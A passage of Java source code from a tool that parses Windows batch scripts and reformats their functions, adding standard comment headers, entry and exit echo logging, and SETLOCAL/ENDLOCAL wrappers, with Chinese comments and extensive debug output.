				method_beginTagCharList = new ArrayList<String>();
				method_beginTagCharList.add("_func_");

				method_beginTagCharList.add(":");
				method_beginTagCharList.add("x");

				method_format_content = new ArrayList<String>();

				method_In_PrintCode = "echo " + Method_In_Tag + " " + bat_method_name; // 函数进入打印代码
				method_Out_PrintCode = "echo " + Method_Out_Tag + " " + bat_method_name; // 函数离开打印代码
				// echo ______________Method_In_searchOneTargetFile4Dir4Type_func_2x1:
				// echo ______________Method_Out_searchOneTargetFile4Dir4Type_func_2x1:

			}

			void initRuleTag() {
				String bat_method_name_nofunc_trim_lower = bat_method_name_nofunc.trim().toLowerCase();
				boolean flagA = bat_method_name_nofunc_trim_lower.startsWith("rule")
						&& bat_method_name_nofunc_trim_lower.contains("v");

				if (!flagA) {

					isRuleMethod = false;
					ruleIndex = -1;
					ruleIndex_Tag = "";
					System.out.println(
							"bat_method_name_nofunc = " + bat_method_name_nofunc + " [isRuleMethod = " + isRuleMethod);
					return;
				}

				String preVStr = bat_method_name_nofunc_trim_lower.substring(0,
						bat_method_name_nofunc_trim_lower.indexOf("v"));
				preVStr = preVStr.replace("rule", "");

				if (isNumeric(preVStr)) {
					isRuleMethod = true;
					ruleIndex = Integer.parseInt(preVStr);
//    		ruleIndex_Tag = Rule_Bat_File_Name +" _"+ruleIndex+"_ ";
					ruleIndex_Tag = "%init_input_0%" + " _" + ruleIndex + "_ ";

					System.out.println("bat_method_name_nofunc = " + bat_method_name_nofunc + " [isRuleMethod = "
							+ isRuleMethod + " ruleIndex=" + ruleIndex + " ruleIndex_Tag=" + ruleIndex_Tag);

				}

			}

			void InitFormatContent() {

				if (method_firstfixed_content.size() == 0) {
					System.out.println("当前Method " + bat_method_name + " 出错 读取到的内容为空"
							+ "method_firstfixed_content.size() = " + method_firstfixed_content.size()
							+ "  method_raw_content.size()=" + method_raw_content.size());
					return;
				}

				// 第一步 添加 函数定义的名称
				method_format_content.add(":" + bat_method_name);

				// 2. 添加 函数分隔提示符
				method_format_content.add(method_seperate_line);

				// 如果 当前 函数 是 rule 函数 那么 需要添加 rule_tip:
				if (isRuleMethod) {
					if (!allRuleMethodNameList.contains(bat_method_name)) {
						allRuleMethodNameList.add(bat_method_name);
					}

					if (method_ruletip_list.size() > 0) {
						for (int i = 0; i < method_ruletip_list.size(); i++) {
							String rule_tip = method_ruletip_list.get(i);
							String addToFormat_ruleStr = rule_tip;
							// 如果当前 tip 不包含 #
							if (!rule_tip.contains("#")) {

								addToFormat_ruleStr = "## " + rule_tip;
							}

							// 把 空格转为 null?
							/*
							 * if(addToFormat_ruleStr.contains(ruleIndex_Tag.replace(" ", ""))) {
							 *
							 * addToFormat_ruleStr = addToFormat_ruleStr.replace(ruleIndex_Tag.replace(" ",
							 * ""), ""); }
							 */

							// 如果 当前 tip 不包含 zbatrule_I9_Rule30.bat _3_ 这样的字样
							// 那么直接 zbatrule_I9_Rule30.bat _3_ ##
							if (!addToFormat_ruleStr.contains(ruleIndex_Tag)) {
								method_format_content
										.add("rem rule_tip: " + ruleIndex_Tag + " " + addToFormat_ruleStr.trim());
								allRuleTipStrList.add(ruleIndex_Tag + " " + addToFormat_ruleStr.trim());
							} else {
								// 如果当前tip 包含 zbatrule_I9_Rule30.bat _3_ 那么变成
								// rem rule_tip: zbatrule_I9_Rule30.bat _3_
								method_format_content.add("rem rule_tip: " + addToFormat_ruleStr.trim());
								allRuleTipStrList.add(addToFormat_ruleStr);
							}

						}
					} else { // 当前没有 rule_tip:时 直接 输出 rem rule_tip: zbatrule_I9_Rule30.bat _3_
						method_format_content.add("rem rule_tip: " + ruleIndex_Tag + "  ## ");
					}

				}

				// 3. 添加 rem:desc 的语句
				if (method_desc_list.size() > 0) {
					for (int i = 0; i < method_desc_list.size(); i++) {
						String desc = method_desc_list.get(i);
						method_format_content.add("rem desc: " + desc);
					}
				} else {
					method_format_content.add("rem desc: ");
				}

				// 4. 添加 rem:sample 的语句

				if (method_Sample_list.size() > 0) {
					for (int i = 0; i < method_Sample_list.size(); i++) {
						String sample = method_Sample_list.get(i);
						method_format_content.add("rem sample: " + sample);
					}
				} else {
					method_format_content.add("rem sample: ");
				}

				// 5. 添加 rem:sample_out: 的语句

				if (method_SampleOut_list.size() > 0) {
					for (int i = 0; i < method_SampleOut_list.size(); i++) {
						String sample_out = method_SampleOut_list.get(i);
						method_format_content.add("rem sample_out: " + sample_out);
					}
				} else {
					method_format_content.add("rem sample_out: ");
				}

				// 6. 增加 setlocal
				method_format_content.add(Pre_SETLOCAL);

				method_format_content.add(method_In_PrintCode); // 添加进入函数的代码

				// 如果是 ruleIndex 那么 需要定义 它的 动态计算的参数
				if (isRuleMethod) {
					for (int i = 0; i < input_param_count; i++) {
						method_format_content.add("set " + bat_method_name_nofunc + "_dynamic_param" + (i + 1) + "=");
					}
				}
				for (int i = 0; i < method_firstfixed_content.size(); i++) {
					String realCodeOne = method_firstfixed_content.get(i);
					String realCodeOne_lower_trim = realCodeOne.trim().toLowerCase();
					// 如果当前实体代码中遇到 goto: eof 之类的 那么在它之前 添加一个 endprint代码
					if (realCodeOne_lower_trim.startsWith(End_Method_Tag)) {
						// 检测之前的 代码是否是 endPrintCode
						int pre_index = i - 1;
						if (pre_index >= 0 && pre_index < method_firstfixed_content.size() - 1) {
							String preOneCode = method_firstfixed_content.get(pre_index).trim();
//    						if(!preOneCode.startsWith(endPrintCode.trim())) {
							// 如果上一行不是 输出打印的话 是打印 输出 end_return语句的话 那么就只添加 一个 method_Out_PrintCode
							if (!preOneCode.equals(method_Out_PrintCode.trim())
									&& preOneCode.equals(endPrintCode.trim())) {
								method_format_content.add(method_Out_PrintCode);
							} else if (!preOneCode.equals(method_Out_PrintCode.trim())
									&& !preOneCode.equals(endPrintCode.trim())) {
								// 如果 既不是 endcode 也不是 outcode 那么 两行 语句 都要 添加
								method_format_content.add(endPrintCode);
								method_format_content.add(method_Out_PrintCode);
							}
						}

					}

					method_format_content.add(realCodeOne);
				}

				String lastCode = method_format_content.get(method_format_content.size() - 1).trim();
				System.out.println("lastCode = 【" + lastCode + "】 !lastCode.equals(endPrintCode.trim()) = 【"
						+ !lastCode.equals(endPrintCode.trim()) + "】  methodname=【" + bat_method_name
						+ "】  endPrintCode=【" + endPrintCode.trim() + "】");
				if (!lastCode.equals(endPrintCode.trim())) {
					// end3. 添加 endprint 代码
					method_format_content.add(endPrintCode);
				}

				// 添加离开函数的Log
				method_format_content.add(method_Out_PrintCode);
				// end2 . 添加
				method_format_content.add(End_SETLOCAL);
				// end1. 添加 Goto:eof
				method_format_content.add(End_Method_Tag);

				ArrayList<String> fixedChineseFormatList = new ArrayList<String>();

				for (int i = 0; i < method_format_content.size(); i++) {
					String formatItem = method_format_content.get(i);
					String preLine = "";
					if (i > 0) {
						preLine = method_format_content.get(i - 1);
					}
					if (isContainChinese(formatItem) && isContainChinese(preLine)) {
						fixedChineseFormatList.add(""); // 打印的时候 自动 添加 /r/n 意味着多添加了 一行
						fixedChineseFormatList.add(formatItem);
						System.out.println("preLine = " + preLine + "   formatItem=" + formatItem);
						continue;
					}
					if (!"".equals(formatItem.trim())) {
						fixedChineseFormatList.add(formatItem);
						System.out.println("formatItem=[" + formatItem + "]");
					}

				}
				method_format_content.clear();
				method_format_content.addAll(fixedChineseFormatList);
				showStringList(method_format_content, bat_method_name + "-Format格式完成后样子");
			}

//          tag=[helloworld_func_0x0raw方法] Line[1]   :helloworld_func_0x0
//    		tag=[helloworld_func_0x0raw方法] Line[2]   ::SETLOCAL
//    		tag=[helloworld_func_0x0raw方法] Line[3]   echo hello_world zukgit
//    		tag=[helloworld_func_0x0raw方法] Line[4]   ::ENDLOCAL
//    		tag=[helloworld_func_0x0raw方法] Line[5]   goto:eof
//    		tag=[helloworld_func_0x0raw方法] Line[6]
//    		tag=[helloworld_func_0x0raw方法] Line[7]   rem ================================  Test_Operation_End ============================

			// 对当前的代码进行 format 格式化
			// 第一行: 函数定义 :xxx_funx_0x0
			// 第二行: 函数显示分割符号 rem ================================ xxx_funx_0x0
			// 第三行: 函数说明的集合 rem desc: xxxxxx
			// 第x行: 函数说明的集合 ::SETLOCAL
			// ...... 【自由发挥空间】
			// ...... 【自由发挥空间】
			// ...... 【自由发挥空间】
			// 倒数第三行 echo isFileExist_return_1=[%isFileExist_return_1%] param1=[%1]
			// 倒数第二行 ::ENDLOCAL
			// 最后一行 goto:eof

			// // 1.去除函数定义语句 2.去除 rem注释开头 :: 开头的语句 (暗含 ::SETLOCAL ::ENDLOCAL)
			void initFirstFixedConent() {

				for (int i = 0; i < method_raw_content.size(); i++) {
					String rawContent = method_raw_content.get(i);
					String batCodeOneLine = method_raw_content.get(i).trim().toLowerCase();
					String batCodeOneLine_clearblank = batCodeOneLine.replace(" ", "");
					if ("".equals(batCodeOneLine)) {
						continue; // 去掉空行
					}
					if (batCodeOneLine.startsWith(":" + bat_method_name.toLowerCase())) {
						continue; // 去掉函数定义的 首行
					}

					if (batCodeOneLine.startsWith("rem ") && batCodeOneLine_clearblank.startsWith("remdesc:")) {
						continue; // 去掉函数定义rem:desc
					}

					if (batCodeOneLine.startsWith("rem ") && batCodeOneLine_clearblank.startsWith("remrule_tip:")) {
						continue; // 去掉函数定义rem:desc
					}

					if (batCodeOneLine.startsWith("echo ")
							&& batCodeOneLine.contains(method_In_PrintCode.toLowerCase().trim())) {
						continue; // 去掉函数定义 echo echo
						// ______________Method_In_searchOneTargetFile4Dir4Type_func_2x1 这样的字符串 进入函数字符串
					}

					if (batCodeOneLine.startsWith("echo ")
							&& batCodeOneLine.contains(method_Out_PrintCode.toLowerCase().trim())) {
						continue; // 去掉函数定义 echo ______________Method_Out_searchOneTargetFile4Dir4Type_func_2x1:
					}

					if (batCodeOneLine.startsWith("rem ") && batCodeOneLine_clearblank.startsWith("remsample:")) {
						continue; // 去掉函数定义rem:desc
					}
					if (batCodeOneLine.startsWith("rem ") && batCodeOneLine_clearblank.startsWith("remsample_out:")) {
						continue; // 去掉函数定义rem:desc
					}

					// 去除掉原始的 EndPrintCode
					if (batCodeOneLine.toLowerCase().contains("EndPrintCode".toLowerCase())) {
						continue; // 去掉函数分隔符 rem ======================== helloworld_func_0x0
					}

					if (batCodeOneLine.toLowerCase().contains("Method_In".toLowerCase())) {
						continue; // 去掉函数分隔符 rem ======================== helloworld_func_0x0
					}
					if (batCodeOneLine.toLowerCase().contains("Method_Out".toLowerCase())) {
						continue; // 去掉函数分隔符 rem ======================== helloworld_func_0x0
					}

					if (batCodeOneLine.toLowerCase().contains(bat_method_name_nofunc.toLowerCase() + "_dynamic_param")
							&& batCodeOneLine.trim().endsWith("=")) {
// set rule3vadbscreen_dynamic_param1=  【删除】
//set rule3vadbscreen_dynamic_param1=1000 不删除
						continue; // 去掉函数分隔符 set rule1vbankupapk_dynamic_param
					}

					// 去除掉原始的 EndPrintCode
					if (batCodeOneLine.toLowerCase().startsWith("rem =====".toLowerCase())) {
						continue; // 去掉函数分隔符 rem ======================== helloworld_func_0x0
					}

					if (batCodeOneLine.startsWith("rem ")
							&& batCodeOneLine_clearblank.contains(bat_method_name_nofunc)) {
						continue; // 去掉函数分隔符 rem ======================== helloworld_func_0x0
					}

					if (batCodeOneLine.startsWith("::setlocal") || batCodeOneLine.startsWith("::endlocal")) {
						continue; // 去掉::SETLOCAL 和 ::ENDLOCAL
					}

					if (batCodeOneLine.startsWith("echo ") && isContainChinese(batCodeOneLine)) { // 如果当前包含中文的 echo 开头的
//                       method_firstfixed_content.add(""); // 在中文前面 添加一个空格  空行 使得 输出不乱码
						method_firstfixed_content.add(rawContent);
					} else {
						method_firstfixed_content.add(rawContent);
					}

				}
				showStringList(method_firstfixed_content, "清头清空清set的函数内容 bat_method_name=" + bat_method_name);

//           echo recordFileNameToFile_return_1=[%recordFileNameToFile_return_1%]  param1=[%1]
//    		 goto:eof
//    		 rem ======================== searchLastFile_func_1x1
//    		 rem 检测当前目录下 时间最新的那么文件
//    		 rem searchLastFile_func_1x1 接受一个路径参数  给出该路径下 最新的那个 实体文件名称   函数的返回值 一致 定义为 函数名_return
//    		 rem searchLastFile_return=K3_MD_Rule.class

				// 检测在 ArrayList 列表中是否有以 goto:eof 为内容的Item
				boolean isContain_GoTo_Eof = isStartWith_lower_trim_InArr(method_firstfixed_content, "goto:eof");

				// 如果 没有 包含 goto:eof 那么也就 不用去除那最后的字符串了
				if (method_firstfixed_content.size() > 0 && isContain_GoTo_Eof) {
					String lastCodeStr = method_firstfixed_content.get(method_firstfixed_content.size() - 1)
							.toLowerCase().trim();
					// 确保当前最后一行 是 goto:eof
					while (!lastCodeStr.startsWith("goto:eof")) {
						method_firstfixed_content.remove(method_firstfixed_content.size() - 1);
						if (method_firstfixed_content.size() == 0) {
							break;
						}
						lastCodeStr = method_firstfixed_content.get(method_firstfixed_content.size() - 1).toLowerCase()
								.trim();
					}

					// 确保删除了 这 最后一行的 goto:eof , 如果下一行 还是 goto:eof 继续删除它
					lastCodeStr = method_firstfixed_content.get(method_firstfixed_content.size() - 1).toLowerCase()
							.trim();
					while (lastCodeStr.startsWith("goto:eof") || "".equals(lastCodeStr)) { // 如果当前的最后一行 是 goto:eof
						// 那么删除该行
						method_firstfixed_content.remove(method_firstfixed_content.size() - 1);
						if (method_firstfixed_content.size() == 0) {
							break;
						}
						lastCodeStr = method_firstfixed_content.get(method_firstfixed_content.size() - 1).toLowerCase()
								.trim();
					}
				}

				showStringList(method_firstfixed_content,
						"清头清空清set的函数内容并且以goto:eof结尾的函数  bat_method_name=" + bat_method_name);

				String lastOneCode = "";
				if (method_firstfixed_content.size() - 1 < 0) {
					lastOneCode = "rem ";
				} else {
					lastOneCode = method_firstfixed_content.get(method_firstfixed_content.size() - 1);
				}
				if (!method_firstfixed_content.contains(endPrintCode)) { // 如果最后打印有 不包含 endprintCode 那么假如 endprintCode
//    				method_firstfixed_content.add(endPrintCode);
					System.out.println("最后一句代码就是 不是EndprintCode  需要加入！！");

				} else {
					System.out.println("最后一句代码就是 EndprintCode  不加入！！");
				}

				showStringList(method_firstfixed_content,
						"清头清空清set的函数内容并且以goto:eof结尾的函数 添加EndPrintCode的函数  bat_method_name=" + bat_method_name);

			}

			void initRemDesc_Sample_SampleOut_RuleTip() {

				for (int i = 0; i < method_raw_content.size(); i++) {
					String oneMethodStr = method_raw_content.get(i);
					// 把空格转为 空 导致 注释 时 必须存在 空格消失了 挤在一块
					String clearBlank = oneMethodStr.replace(" ", "");
//    				String clearBlank = oneMethodStr.trim();
					if (clearBlank.startsWith("remdesc:") && oneMethodStr.startsWith("rem ")) {
						String descStr = oneMethodStr.replace("rem desc:", "");
						descStr = descStr.replace("rem  desc:", "");
						descStr = descStr.replace("rem   desc:", "");
						descStr = descStr.replace("rem   desc:", "");
						if (!"".equals(descStr.trim())) {
							method_desc_list.add(descStr.trim());
						}

					}
				}
				showStringList(method_desc_list, "方法说明");

				if (isRuleMethod) {
					for (int i = 0; i < method_raw_content.size(); i++) {
						String oneMethodStr = method_raw_content.get(i);
						// 把 所有的
// rem rule_tip: zbatrule_I9_Rule30.bat _3_  500 ##手机执行adbshellinputswipe340800340100命令向下滑动两下向上滑动一下

						String clearBlank = oneMethodStr.replace(" ", "");
						if (clearBlank.startsWith("remrule_tip:") && oneMethodStr.startsWith("rem ")) {

							if (oneMethodStr.startsWith("rem ")) {
								oneMethodStr = oneMethodStr.substring(4);
							}
							String descStr = oneMethodStr.replace("remrule_tip:", "");
							descStr = descStr.replace("rem  rule_tip:", "");
							descStr = descStr.replace("rem   rule_tip:", "");
							descStr = descStr.replace("rule_tip:", "");
							descStr = descStr.replace("rule_tip:", "");
							// rem rule_tip:
							if (!"".equals(descStr.trim())) {
								method_ruletip_list.add(descStr.trim());
							}

						}
					}
					showStringList(method_ruletip_list, "ruleTip说明");

				}

				for (int i = 0; i < method_raw_content.size(); i++) {
					String oneMethodStr = method_raw_content.get(i);
					String clearBlank = oneMethodStr.replace(" ", "");
					if (clearBlank.startsWith("remsample:") && oneMethodStr.startsWith("rem ")) {
						String descStr = oneMethodStr.replace("remsample:", "");
						descStr = descStr.replace("rem sample:", "");
						descStr = descStr.replace("rem  sample:", "");
						descStr = descStr.replace("rem   sample:", "");
						descStr = descStr.replace("sample:", "");

						if (!"".equals(descStr.trim())) {
							method_Sample_list.add(descStr.trim());
						}

					}
				}
				showStringList(method_Sample_list, "方法实例");

				for (int i = 0; i < method_raw_content.size(); i++) {
					String oneMethodStr = method_raw_content.get(i);
					String clearBlank = oneMethodStr.replace(" ", "");
					if (clearBlank.startsWith("remsample_out:") && oneMethodStr.startsWith("rem ")) {
						String descStr = oneMethodStr.replace("remsample_out:", "");
						descStr = descStr.replace("rem sample_out:", "");
						descStr = descStr.replace("rem  sample_out:", "");
						descStr = descStr.replace("rem   sample_out:", "");
						descStr = descStr.replace("sample_out:", "");

						if (!"".equals(descStr.trim())) {
							method_SampleOut_list.add(descStr.trim());
						}

					}
				}
				showStringList(method_SampleOut_list, "方法实例输出");

			}

			void clearAllData() {
				method_raw_content.clear();
				method_firstfixed_content.clear();
				method_desc_list.clear();
				method_Sample_list.clear();
				method_SampleOut_list.clear();
				method_format_content.clear();
			}

			void doFormat() {
				// 1. 获取 所有 rem desc: 开头的字符串
				// 2. 检测 rawMethod中 最后一行是否是 goto:eof
				// 如果不是 2.1如果否代码 不是 rem开头的话 那么直接删除
				// 2.2如果是代码 那么手动 添加 goto:eof
				// 3. 检测 倒数第二行 是否是 ::ENDLOCAL
				// 3.1 检测当前rawMethod是否包含 ::ENDLOCAL 如果不包含 那么添加 如果包含 那么删除原有的 ::ENDLOCAL 再添加到这里
				// 4. 把 自由发挥空间 过滤出来 导出来到 format_list 中
				// zzzzzzzzzzz

				if (method_raw_content.size() == 0) {
					System.out.println("当前 method_raw_content 为空, 无法执行 Method的 format 方法!");
					return;
				}
				initRemDesc_Sample_SampleOut_RuleTip();
				initFirstFixedConent();
				InitFormatContent(); // 开始拼凑 formatList 了

			}

			// 检测 Method 结束 遇到新的 Method的标识符就意味着结束
			// 检测 Method 开始
			boolean isMethodEnd(String oneLine) {
				boolean isMethodEndLine = false;
				String oneLine_trim = oneLine.toLowerCase().trim();
				// 必须以: 开头 并且 不以:: 开头
				if (!oneLine_trim.startsWith(":") || oneLine_trim.startsWith("::")) {
					System.out.println("ZZZZBBBB_isMethodEnd  beginTagChar =:" + oneLine_trim + "isMethodEndLine = "
							+ isMethodEndLine);

					return isMethodEndLine;
				}

				for (int i = 0; i < method_beginTagCharList.size(); i++) {
					String beginTagChar = method_beginTagCharList.get(i);
					if (!oneLine_trim.contains(beginTagChar)) {
//          					System.out.println(" beginTagChar = "+ beginTagChar + " 不包含在:"+oneLine_trim);
						System.out.println("ZZZZAAA_isMethodEnd  beginTagChar =:" + oneLine_trim + "isMethodEndLine = "
								+ isMethodEndLine);

						return isMethodEndLine;
					}

				}

				System.out.println("ZZZZAAA_isMethodEnd  oneLine_trim=" + oneLine_trim + "    oneLine=" + oneLine);
				// :searchlastfile_func_1x1
				if (oneLine_trim.startsWith(":") && !oneLine_trim.startsWith("::") && oneLine_trim.contains("_func_")
						&& oneLine_trim.contains("x") && !oneLine_trim.contains(" ")) { // 以: 开头 并不以 :: 开头

					String[] splitArr = oneLine.split("_");
					if (splitArr != null) {
						String lastPartStr = splitArr[splitArr.length - 1];
						// :helloworld_func_0x0
						String firstPartStr = splitArr[0].toLowerCase().trim();

						String inputParamStr = lastPartStr.substring(0, lastPartStr.indexOf("x"));
						String outputParamStr = lastPartStr.substring(lastPartStr.indexOf("x") + "x".length());
						// 如果检测到一个新的 方法 这个方法的名字 和 当前的名字 不一样 那么就意味着 这个函数定义的结束

						// ZZZZAAA_isMethodEnd oneLine_trim=:string_test_func_0x0
						// oneLine=:string_test_func_0x0
						// ZZZZ1111_isMethodEnd outputParamStr = 0isNumeric(outputParamStr)=true
						// inputParamStr =0 isNumeric(inputParamStr)=true
						// !firstPartStr.contains(bat_method_name_nofunc)=true beginTagChar
						// =::string_test_func_0x0 isMethodEndLine = false firstPartStr = :string
						// bat_method_name_nofunc=string_test
						// ZZZZ2222_isMethodEnd beginTagChar =:string_test_func_0x0 isMethodEndLine =
						// true firstPartStr = :string bat_method_name_nofunc=string_test
						// ZZZZ5555__isMethodEnd beginTagChar =:string_test_func_0x0 isMethodEndLine =
						// true

						System.out.println("ZZZZ1111_isMethodEnd  outputParamStr = " + outputParamStr
								+ "isNumeric(outputParamStr)=" + isNumeric(outputParamStr) + "  inputParamStr ="
								+ inputParamStr + "  isNumeric(inputParamStr)=" + isNumeric(inputParamStr)
								+ " !firstPartStr.contains(bat_method_name_nofunc)="
								+ !firstPartStr.contains(bat_method_name_nofunc) + "  beginTagChar =:" + oneLine_trim
								+ "   isMethodEndLine = " + isMethodEndLine + "  firstPartStr = " + firstPartStr
								+ "   bat_method_name_nofunc=" + bat_method_name_nofunc);

						if (isNumeric(outputParamStr.trim()) && isNumeric(inputParamStr.trim())
								&& !firstPartStr.contains(bat_method_name_nofunc)) {

							isMethodEndLine = true;
							System.out.println("ZZZZ2222_isMethodEnd  beginTagChar =" + oneLine_trim
									+ "   isMethodEndLine = " + isMethodEndLine + "  firstPartStr = " + firstPartStr
									+ "   bat_method_name_nofunc=" + bat_method_name_nofunc);

						} else {
							System.out.println("ZZZZ3333_isMethodEnd  beginTagChar =" + oneLine_trim
									+ "   isMethodEndLine = " + isMethodEndLine + "  firstPartStr = " + firstPartStr
									+ "   bat_method_name_nofunc=" + bat_method_name_nofunc);

						}
					}

				} else {
					System.out.println("ZZZZ4444__isMethodEnd  beginTagChar =" + oneLine_trim + "   isMethodEndLine = "
							+ isMethodEndLine);

				}
				System.out.println("ZZZZ5555__isMethodEnd  beginTagChar =" + oneLine_trim + "isMethodEndLine = "
						+ isMethodEndLine);

				return isMethodEndLine;

			}

			// 检测 Method 开始
			boolean isMethodBegin(String oneLine) {
				boolean isMethodBeginLine = false;
				String oneLine_trim = oneLine.toLowerCase().trim();
				// 必须以: 开头 并且 不以:: 开头
				if (!oneLine_trim.startsWith(":") || oneLine_trim.startsWith("::")) {

					System.out.println("ZZZZZ0000_isMethodBegin   oneLine_trim=" + oneLine_trim + "    bat_method_name="
							+ bat_method_name);

					return isMethodBeginLine;
				}

				for (int i = 0; i < method_beginTagCharList.size(); i++) {
					String beginTagChar = method_beginTagCharList.get(i);
					if (!oneLine_trim.contains(beginTagChar)) {
//    					System.out.println(" beginTagChar = "+ beginTagChar + " 不包含在:"+oneLine_trim);
						System.out.println("ZZZZZ1111_isMethodBegin   oneLine_trim=" + oneLine_trim
								+ "    bat_method_name=" + bat_method_name);

						return isMethodBeginLine;
					}
//    				method_beginTagCharList.add(methodName);
					if (!oneLine_trim.contains(bat_method_name)) { // 把 名字单独提出来
						System.out.println("ZZZZZ2222_isMethodBegin   oneLine_trim=" + oneLine_trim
								+ "    bat_method_name=" + bat_method_name + " isMethodBeginLine=" + isMethodBeginLine);

						return isMethodBeginLine;
					}
				}

				if (oneLine_trim.startsWith(":") && !oneLine_trim.startsWith("::") && oneLine_trim.contains("_func_")
						&& oneLine_trim.contains("x") && !oneLine_trim.contains(" ")) { // 以: 开头 并不以 :: 开头

					String[] splitArr = oneLine.split("_");
					if (splitArr != null) {
						String lastPartStr = splitArr[splitArr.length - 1];

						String inputParamStr = lastPartStr.substring(0, lastPartStr.indexOf("x"));
						String outputParamStr = lastPartStr.substring(lastPartStr.indexOf("x") + "x".length());
						if (isNumeric(outputParamStr.trim()) && isNumeric(inputParamStr.trim())) {
							System.out.println("ZZZZZ33333_isMethodBegin isMethodBeginLine = true   oneLine_trim="
									+ oneLine_trim + "    bat_method_name=" + bat_method_name + " isMethodBeginLine="
									+ isMethodBeginLine);
							isMethodBeginLine = true;
						}
					}

				} else {

					System.out.println("ZZZZZ333AAA_isMethodBegin   oneLine_trim=" + oneLine_trim
							+ "    bat_method_name=" + bat_method_name + " isMethodBeginLine=" + isMethodBeginLine);

				}
				System.out.println("ZZZZZ4444_isMethodBegin   oneLine_trim=" + oneLine_trim + "    bat_method_name="
						+ bat_method_name + " isMethodBeginLine=" + isMethodBeginLine);

				return isMethodBeginLine;

			}

			// getFileNameNoPointWithFullPath_return_1=[Z_TEMP]
			// param1=[C:\Users\zhuzj5\Desktop\zbin\Z_TEMP.txt]
			void buildEndPrintCode(String methodName, String methodName_nofunc, int inputParamCount,
								   int outputParamCount, boolean isRuleMethod) {
				endPrintCode = "";
				String preCode = "echo [" + methodName + " EndPrintCode] ";
				if (inputParamCount == 0 && outputParamCount == 0) {
					// stringTrim_func_1x1 input_1_param ==[%1]
					endPrintCode = preCode + "  output=[__empty__]  param1=[__empty__] ";
					return;
				}

				// 没有输入参数 但有输出参数
				if (inputParamCount == 0 && outputParamCount > 0) {
					StringBuilder sb = new StringBuilder();
					for (int i = 1; i < outputParamCount + 1; i++) {
						String returnItem = methodName_nofunc + Method_Return_Tag + i;
						String currentCode = returnItem + "=[!" + returnItem + "!]" + "   ";
						sb.append(currentCode);
					}

					if (isRuleMethod) {
						sb.append("dynamic_param1=[__empty__] ");

					} else {
						sb.append("param1=[__empty__] ");
					}
					endPrintCode = preCode + sb.toString();
					return;
				}

				// 有输入参数 但有没输出参数
				if (inputParamCount > 0 && outputParamCount == 0) {
					StringBuilder sb = new StringBuilder();
					for (int i = 1; i < inputParamCount + 1; i++) {
						String paramItem = "param" + i;
						String currentCode = paramItem + "=[%" + i + "]" + "   ";

						if (isRuleMethod) {
							paramItem = "dynamic_param" + i;
							currentCode = paramItem + "=[!" + methodName_nofunc + "_dynamic_param" + i + "!]" + "   ";
						}
						sb.append(currentCode);
					}

					endPrintCode = preCode + "   output=[__empty__] " + sb.toString();
					return;
				}

				// 有输入参数 也有 输出参数
				if (inputParamCount > 0 && outputParamCount > 0) {
					StringBuilder sb = new StringBuilder();

					for (int i = 1; i < outputParamCount + 1; i++) {
						String returnItem = methodName_nofunc + Method_Return_Tag + i;
						String currentCode = returnItem + "=[!" + returnItem + "!]" + "   ";
						sb.append(currentCode);
					}

					for (int i = 1; i < inputParamCount + 1; i++) {
						String paramItem = "param" + i;
						String currentCode = paramItem + "=[%" + i + "]" + "   ";
						if (isRuleMethod) {
							paramItem = "dynamic_param" + i;
							currentCode = paramItem + "=[!" + methodName_nofunc + "_dynamic_param" + i + "!]" + "   ";
						}

						sb.append(currentCode);
					}

					endPrintCode = preCode + "  " + sb.toString();
					return;
				}

			}

			// getsubstringwithpre_func_2x1 得到输入的参数个数2 以及要输出的参数个数1
			void initParamsCount(String methodName) {
				String[] splitArr = methodName.split("_");
				if (splitArr != null) {
					String lastPartStr = splitArr[splitArr.length - 1];
					String inputParamStr = lastPartStr.substring(0, lastPartStr.indexOf("x"));
					String outputParamStr = lastPartStr.substring(lastPartStr.indexOf("x") + "x".length());

					if (isNumeric(inputParamStr)) {
						input_param_count = Integer.parseInt(inputParamStr);
					}

					if (isNumeric(outputParamStr)) {
						output_param_count = Integer.parseInt(outputParamStr);
					}
				}
			}

		}

		boolean isContainChinese(String str) {
			Pattern p = Pattern.compile("[\u4e00-\u9fa5]");
			Matcher m = p.matcher(str);
			if (m.find()) {
				return true;
			}
			return false;
		}

		ArrayList<String> Bat_To_Format(ArrayList<String> batContentList) {
//    		Bat_Aera system_init_aera = null;
//    		Bat_Aera program_execute_aera = null;
//    		Bat_Aera func_define_aera = null;

			// rem ══════════════════════════════════════════ System_Init_Aera_Begin
			// ══════════════════════════════════════════

			// 1. 含有 rem 并以它为开头 2. 含有 area标识 ══ _area_ 3. 含有当前area的名字
			Bat_Aera system_init_aera = new Bat_Aera(0, "system_init_aera");
			Bat_Aera program_execute_aera = new Bat_Aera(1, "program_execute_aera");
			Bat_Aera func_define_aera = new Bat_Aera(2, "func_define_aera", true);
			Bat_Aera main_enter_aera = new Bat_Aera(3, "main_enter_aera");

			mAreaList.add(system_init_aera);
			mAreaList.add(program_execute_aera);
			mAreaList.add(func_define_aera);
			mAreaList.add(main_enter_aera);
			initRawContentInArea(batContentList, mAreaList);

			ArrayList<String> formatAllBatCodeList = buildAllBatFormatContent(mAreaList);

			showStringList(allRuleTipStrList, "RuleTip列表");
			Bat_Method rulePrintMethod = getMethodByName("ruletipprint");
			build_rulePrintMethod(rulePrintMethod, allRuleTipStrList); // 重绘 rawContent

			formatAllBatCodeList = buildAllBatFormatContent(mAreaList);

			return formatAllBatCodeList;
//
		}

		void build_rulePrintMethod(Bat_Method rulePrintMethod, ArrayList<String> tipList) {

			ArrayList<String> newRulePrintMethodRaw = new ArrayList<String>();
			newRulePrintMethodRaw.add(":" + rulePrintMethod.bat_method_name);
			newRulePrintMethodRaw.add("rem desc: Bussiness_Rule打印程序用于打印batrule规则序列");

//    		newRulePrintMethodRaw.addAll(tipList);

			for (int i = 0; i < tipList.size(); i++) {
				String tipStr = tipList.get(i);
				if (isContainChinese(tipStr)) {
//    				newRulePrintMethodRaw.add("\n");
					newRulePrintMethodRaw.add("echo " + tipList.get(i));
				} else {
					newRulePrintMethodRaw.add("echo " + tipList.get(i));
				}

			}

			newRulePrintMethodRaw.add("goto:eof");
			rulePrintMethod.clearAllData();
			rulePrintMethod.method_raw_content = newRulePrintMethodRaw;
			showStringList(rulePrintMethod.method_raw_content, rulePrintMethod.bat_method_name + "新的rawContent");

			rulePrintMethod.doFormat();
		}

		ArrayList<String> buildAllBatFormatContent(ArrayList<Bat_Aera> areaList) {
			ArrayList<String> allFormatList = new ArrayList<String>();
			if (areaList == null || areaList.size() == 0) {
				System.out.println("当前解析到的 ArrayList<Bat_Aera> 为空 无法执行format bat 代码的操作!");
				return null;
			}

			allFormatList.add(batHead_1); // @ECHO off
